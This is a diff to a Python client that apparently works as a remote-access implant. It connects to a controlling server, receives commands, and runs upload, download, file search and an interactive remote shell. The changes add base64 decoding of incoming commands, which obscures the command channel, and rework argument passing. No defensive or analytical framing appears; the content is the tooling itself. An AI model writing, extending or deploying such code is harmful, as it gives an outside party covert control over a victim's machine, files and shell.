@@ -1,3 +1,4 @@
+import base64
 import socket, ssl, threading, os, subprocess
 import platform, uuid
 import hashlib
@@ -107,13 +108,15 @@ class Client:
         self.debug_print("THREADED RECEIVE COMMANDS", True)
         while not self.is_killed:
             try:
-                command = self.server_sock.recv(COMMAND_CHUNK_SIZE).decode()
+                # command = self.server_sock.recv(COMMAND_CHUNK_SIZE).decode()
+                command = self.base64_receive_data(self.server_sock)
+                self.debug_print(f"Data decoded :: {command}")
                 if command:
                     command_name, *args = command.split(' ')
                     command_name = command_name.lower()
                     self.debug_print(f"Command received :: {command_name}")
                     if command_name in self.commands:
-                        self.commands[command_name](' '.join(args))
+                        self.commands[command_name](args)
                         self.debug_print("Command executed")
                 # else:
                 #     self.debug_print("no data received")
@@ -256,27 +259,28 @@ class Client:
             self.beat_sock.connect((self.server_address, self.server_beat_port))
             self.block_sending_data(self.beat_id, self.beat_sock)
 
+    def base64_receive_data(self, socket):
+        data = socket.recv(COMMAND_CHUNK_SIZE).decode()
+        self.debug_print(f"Data received :: {data} {len(data)} bytes")
+        return base64.b64decode(data).decode()
+
     ####################################################################################################################
     ########################################### CLIENT COMMANDS ########################################################
     ####################################################################################################################
 
     def download(self, args):
         self.debug_print("DOWNLOAD", True)
-        args = args.split(" ")
         for file_path in args:
             self.get_file(file_path)
 
     def upload(self, args):
         self.debug_print("UPLOAD", True)
-        self.debug_print(f"Args :: {args}")
-        args = args.split(" ")
         for file_path in args:
             self.debug_print(f"Uploading {file_path[0]}")
             self.send_file(file_path)
 
     def search(self, args):
         self.debug_print("SEARCH", True)
-        args = args.split(" ")
         filename = args[1]
         results = []
         for root, dir, files in os.walk(args[0]):
@@ -292,7 +296,8 @@ class Client:
     def shell(self, args):
         self.debug_print("SHELL", True)
         while True:
-            command = self.server_sock.recv(COMMAND_CHUNK_SIZE).decode()
+            command = self.base64_receive_data(self.server_sock)
+            # command = self.server_sock.recv(COMMAND_CHUNK_SIZE).decode()
             if command.strip().lower() == 'exit':
                 self.debug_print("Exiting the shell")
                 break
